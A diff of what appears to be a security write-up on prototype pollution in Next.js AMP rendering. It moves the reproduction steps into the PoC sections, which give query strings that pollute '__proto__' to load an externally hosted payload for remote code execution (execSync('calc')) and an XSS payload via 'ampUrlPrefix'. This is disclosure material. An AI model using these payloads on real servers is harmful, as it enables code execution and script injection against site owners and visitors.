@@ -38,16 +38,16 @@ npm start
 
 **Poc**
 
+1. Request to any AMP enabled page
+2. If AMP if disabled on vulnerable page enable it via `amp=1&__proto__.amp=hybrid`.
+3. Request to vulnerable page with `validator` should trigger the RCE.
+
 ```sh
 # Hosted payload: (this.constructor.constructor("return process.mainModule.require('child_process')")()).execSync('calc')
 /vulnerable?amp=1&__proto__.amp=hybrid&__proto__.validator=https://xss-callback.pwnfunction.repl.co/
 ```
 
 **Cause**
-
-1. Request to any AMP enabled page
-2. If AMP if disabled on vulnerable page enable it via `amp=1&__proto__.amp=hybrid`.
-3. Request to vulnerable page with `validator` should trigger the RCE.
 
 ```js
 /* next/server/render.tsx */
@@ -123,6 +123,10 @@ Also a partial SSRF via `node-fetch` during AMP transform.
 
 **Poc**
 
+1. Request to any AMP enabled page
+2. If AMP if disabled on vulnerable page enable it via `amp=1&__proto__.amp=hybrid`.
+3. Request to vulnerable page with `ampUrlPrefix` should trigger the XSS.
+
 ```sh
 # Hosted payload: alert(document.domain)
 
@@ -141,10 +145,6 @@ Also a partial SSRF via `node-fetch` during AMP transform.
 ```
 
 **Cause**
-
-1. Request to any AMP enabled page
-2. If AMP if disabled on vulnerable page enable it via `amp=1&__proto__.amp=hybrid`.
-3. Request to vulnerable page with `ampUrlPrefix` should trigger the XSS.
 
 ```js
 /* next/server/render.tsx */
